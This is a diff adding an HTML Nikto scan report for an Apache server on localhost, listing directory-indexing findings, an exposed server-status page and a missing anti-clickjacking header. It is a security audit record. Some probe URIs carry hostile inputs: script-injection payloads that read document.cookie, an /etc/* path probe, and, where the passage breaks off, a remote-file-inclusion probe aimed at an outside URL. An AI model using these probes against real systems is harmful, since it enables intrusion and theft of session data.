@@ -1,0 +1,1056 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+        "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+ <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+ <title>Nikto Report</title>
+ <style type="text/css">
+  .dataTable
+  {
+   font-family: tahoma, sans-serif;
+   font-size: 11pt; 
+   font-weight: normal; 
+   color: #000066;
+   background: #EEEEEE;
+   border: thin solid black;
+  }
+  .headerTable
+  {
+   font-family: tahoma, sans-serif;
+   font-size: 15pt; 
+   font-weight: normal; 
+   color: white;
+   background: #000066;
+   border: thin solid black;
+  }
+  .column-head
+  {
+   width: 15em;
+  }
+  .copyright
+  {
+   font-family: tahoma, sans-serif;
+   font-size: 10pt;
+   font-weight: normal;
+   font-style: italic;
+   color: black;
+  }
+  body
+  {
+   background: white;
+  }
+ </style>
+</head>
+<body>
+<div>
+<a name="1"></a><table class="headerTable" width="300"><tr><td>localhost / 127.0.0.1 port 80</td></tr></table>
+<table width="95%" class="dataTable">
+ <tr>
+   <td class="column-head" valign="top"><b>Target IP</b></td>
+   <td>127.0.0.1</td>
+ </tr>
+ <tr>
+   <td class="column-head"><b>Target hostname</b></td>
+   <td>localhost</td>
+ </tr>
+  <tr>
+   <td class="column-head"><b>Target Port</b></td>
+   <td>80</td>
+ </tr>
+  <tr>
+   <td class="column-head"><b>HTTP Server</b></td>
+   <td>Apache/2.4.58 (Ubuntu)</td>
+ </tr>
+ <tr>
+   <td class="column-head"><b>Site Link (Name)</b></td>
+   <td>
+     <a href="http://localhost:80">http://localhost:80</a>
+    </td>
+ </tr>
+ <tr>
+   <td class="column-head"><b>Site Link (IP)</b></td>
+   <td>
+     <a href="http://127.0.0.1:80">http://127.0.0.1:80</a>
+   </td>
+ </tr>
+ </table>
+</div>
+<p></p>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>The anti-clickjacking X-Frame-Options header is not present.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/">http://localhost:80/</a><br>
+      <a href="http://127.0.0.1:80/">http://127.0.0.1:80/</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/0" title="More vuln information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/">http://localhost:80/</a><br>
+      <a href="http://127.0.0.1:80/">http://127.0.0.1:80/</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>OPTIONS</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>Allowed HTTP Methods: GET, POST, OPTIONS, HEAD </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/">http://localhost:80/</a><br>
+      <a href="http://127.0.0.1:80/">http://127.0.0.1:80/</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/0" title="More vuln information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/./</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/./: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/./">http://localhost:80/./</a><br>
+      <a href="http://127.0.0.1:80/./">http://127.0.0.1:80/./</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?mod=node&nid=some_thing&op=view</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?mod=node&nid=some_thing&op=view: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?mod=node&nid=some_thing&op=view">http://localhost:80/?mod=node&nid=some_thing&op=view</a><br>
+      <a href="http://127.0.0.1:80/?mod=node&nid=some_thing&op=view">http://127.0.0.1:80/?mod=node&nid=some_thing&op=view</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?mod=some_thing&op=browse</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?mod=some_thing&op=browse: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?mod=some_thing&op=browse">http://localhost:80/?mod=some_thing&op=browse</a><br>
+      <a href="http://127.0.0.1:80/?mod=some_thing&op=browse">http://127.0.0.1:80/?mod=some_thing&op=browse</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/./</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/./: Appending '/./' to a directory allows indexing</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/./">http://localhost:80/./</a><br>
+      <a href="http://127.0.0.1:80/./">http://127.0.0.1:80/./</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/0" title="More vuln information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>//</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>//: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80//">http://localhost:80//</a><br>
+      <a href="http://127.0.0.1:80//">http://127.0.0.1:80//</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>//</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>//: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80//">http://localhost:80//</a><br>
+      <a href="http://127.0.0.1:80//">http://127.0.0.1:80//</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/0" title="More vuln information on OSVDB.org">OSVDB-0</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?Open</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?Open: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?Open">http://localhost:80/?Open</a><br>
+      <a href="http://127.0.0.1:80/?Open">http://127.0.0.1:80/?Open</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?OpenServer</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?OpenServer: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?OpenServer">http://localhost:80/?OpenServer</a><br>
+      <a href="http://127.0.0.1:80/?OpenServer">http://127.0.0.1:80/?OpenServer</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/%2e/</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/%2e/: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/%2e/">http://localhost:80/%2e/</a><br>
+      <a href="http://127.0.0.1:80/%2e/">http://127.0.0.1:80/%2e/</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/%2e/</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/%2e/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. BID-2513.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/%2e/">http://localhost:80/%2e/</a><br>
+      <a href="http://127.0.0.1:80/%2e/">http://127.0.0.1:80/%2e/</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/576" title="More vuln information on OSVDB.org">OSVDB-576</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?mod=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&op=browse</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?mod=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&op=browse: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?mod=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&op=browse">http://localhost:80/?mod=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&op=browse</a><br>
+      <a href="http://127.0.0.1:80/?mod=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&op=browse">http://127.0.0.1:80/?mod=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&op=browse</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?sql_debug=1</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?sql_debug=1: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?sql_debug=1">http://localhost:80/?sql_debug=1</a><br>
+      <a href="http://127.0.0.1:80/?sql_debug=1">http://127.0.0.1:80/?sql_debug=1</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>///</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>///: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80///">http://localhost:80///</a><br>
+      <a href="http://127.0.0.1:80///">http://127.0.0.1:80///</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/server-status</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/server-status: This reveals Apache information. Comment out appropriate line in httpd.conf or restrict access to allowed hosts.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/server-status">http://localhost:80/server-status</a><br>
+      <a href="http://127.0.0.1:80/server-status">http://127.0.0.1:80/server-status</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/561" title="More vuln information on OSVDB.org">OSVDB-561</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?PageServices</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?PageServices: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?PageServices">http://localhost:80/?PageServices</a><br>
+      <a href="http://127.0.0.1:80/?PageServices">http://127.0.0.1:80/?PageServices</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?PageServices</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. CVE-1999-0269.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?PageServices">http://localhost:80/?PageServices</a><br>
+      <a href="http://127.0.0.1:80/?PageServices">http://127.0.0.1:80/?PageServices</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/119" title="More vuln information on OSVDB.org">OSVDB-119</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?wp-cs-dump</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?wp-cs-dump: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?wp-cs-dump">http://localhost:80/?wp-cs-dump</a><br>
+      <a href="http://127.0.0.1:80/?wp-cs-dump">http://127.0.0.1:80/?wp-cs-dump</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?wp-cs-dump</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. CVE-1999-0269.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?wp-cs-dump">http://localhost:80/?wp-cs-dump</a><br>
+      <a href="http://127.0.0.1:80/?wp-cs-dump">http://127.0.0.1:80/?wp-cs-dump</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/119" title="More vuln information on OSVDB.org">OSVDB-119</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////">http://localhost:80///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</a><br>
+      <a href="http://127.0.0.1:80///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////">http://127.0.0.1:80///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when 	 /'s are requested.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////">http://localhost:80///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</a><br>
+      <a href="http://127.0.0.1:80///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////">http://127.0.0.1:80///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3288" title="More vuln information on OSVDB.org">OSVDB-3288</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?pattern=/etc/*&sort=name</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?pattern=/etc/*&sort=name: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?pattern=/etc/*&sort=name">http://localhost:80/?pattern=/etc/*&sort=name</a><br>
+      <a href="http://127.0.0.1:80/?pattern=/etc/*&sort=name">http://127.0.0.1:80/?pattern=/etc/*&sort=name</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?D=A</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?D=A: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?D=A">http://localhost:80/?D=A</a><br>
+      <a href="http://127.0.0.1:80/?D=A">http://127.0.0.1:80/?D=A</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?N=D</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?N=D: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?N=D">http://localhost:80/?N=D</a><br>
+      <a href="http://127.0.0.1:80/?N=D">http://127.0.0.1:80/?N=D</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?S=A</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?S=A: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?S=A">http://localhost:80/?S=A</a><br>
+      <a href="http://127.0.0.1:80/?S=A">http://127.0.0.1:80/?S=A</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?M=A</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?M=A: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?M=A">http://localhost:80/?M=A</a><br>
+      <a href="http://127.0.0.1:80/?M=A">http://127.0.0.1:80/?M=A</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?\&quot;&gt;&lt;script&gt;alert('Vulnerable');&lt;/script&gt;</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
+    <td>/?\&quot;&gt;&lt;script&gt;alert('Vulnerable');&lt;/script&gt;: Directory indexing found.</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Test Links</b></td>
+    <td>
+      <a href="http://localhost:80/?\&quot;&gt;&lt;script&gt;alert('Vulnerable');&lt;/script&gt;">http://localhost:80/?\&quot;&gt;&lt;script&gt;alert('Vulnerable');&lt;/script&gt;</a><br>
+      <a href="http://127.0.0.1:80/?\&quot;&gt;&lt;script&gt;alert('Vulnerable');&lt;/script&gt;">http://127.0.0.1:80/?\&quot;&gt;&lt;script&gt;alert('Vulnerable');&lt;/script&gt;</a>
+    </td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>OSVDB Entries</b></td>
+    <td>
+       <a href="http://osvdb.org/3268" title="More vuln information on OSVDB.org">OSVDB-3268</a>
+    </td>
+</table>
+
+<table  class="dataTable" width="95%">
+  <tr>
+    <td class="column-head" valign="top"><b>URI</b></td>
+    <td>/?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt?</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>HTTP Method</b></td>
+    <td>GET</td>
+  </tr>
+  <tr>
+    <td class="column-head" valign="top"><b>Description</b></td>
